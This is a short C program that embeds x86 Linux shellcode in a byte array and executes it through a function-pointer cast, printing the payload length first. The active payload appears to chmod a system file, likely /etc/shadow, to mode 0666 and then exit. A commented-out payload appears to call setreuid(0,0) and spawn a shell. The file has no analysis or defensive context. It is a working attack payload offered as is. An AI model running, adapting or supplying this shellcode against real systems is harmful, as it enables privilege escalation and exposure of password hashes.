#include <stdio.h>

unsigned char shellcode[] = \
//"\x31\xdb\x31\xc9\xf7\xe1\xb0\x46\xcd\x80\x6a\x0b\x58\x52\xbe\x1e\x1e\x62\x57\x81\xc6\x11\x11\x11\x11\x56\xbe\x1e\x51\x58\x5d\x81\xc6\x11\x11\x11\x11\x56\x89\xe3\x52\x53\x89\xe1\xcd\x80";
"\x31\xd2\x6a\x0f\x58\x52\x6a\x77\x66\x68\x64\x6f\xbe\x2f\x84\x79\x72\x81\xee\x10\x11\x11\x11\x56\xbe\x1e\x54\x63\x52\x81\xc6\x11\x11\x11\x11\x56\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80\x6a\x01\x58\xcd\x80";



main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}
